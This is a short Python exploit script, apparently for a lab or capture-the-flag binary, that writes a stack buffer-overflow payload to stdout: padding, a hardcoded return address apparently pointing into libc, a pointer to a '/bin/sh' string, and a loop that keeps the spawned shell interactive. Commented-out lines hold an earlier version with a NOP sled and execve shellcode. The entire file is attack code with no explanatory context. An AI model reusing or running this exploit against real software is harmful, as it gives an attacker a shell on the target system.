import socket
import sys
import time
import struct



def main():
#    buf = b"\x90" * 80;
#    buf += b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
#    buf += b'A' * (140 - 25 - 80)
#    buf += b'\xb0\xd4\xff\xff'
#    buf += b'\x50\xd4\xff\xff'
#    buf = b'A' * 144
    buf = b'A' * 140
    buf += struct.pack('<I', 0xf7e29d10)
    buf += b'A' * 4
    buf += struct.pack('<I', 0xffffd4a0 + 140 + 12)
    buf += b'/bin/sh'
    

    time.sleep(1)
    sys.stdout.buffer.write(buf)
    sys.stdout.flush()
    time.sleep(1)

    while True:
        s = sys.stdin.readline()
        sys.stdout.write(s + "\n")
        sys.stdout.flush()



if __name__ == "__main__":
    main()
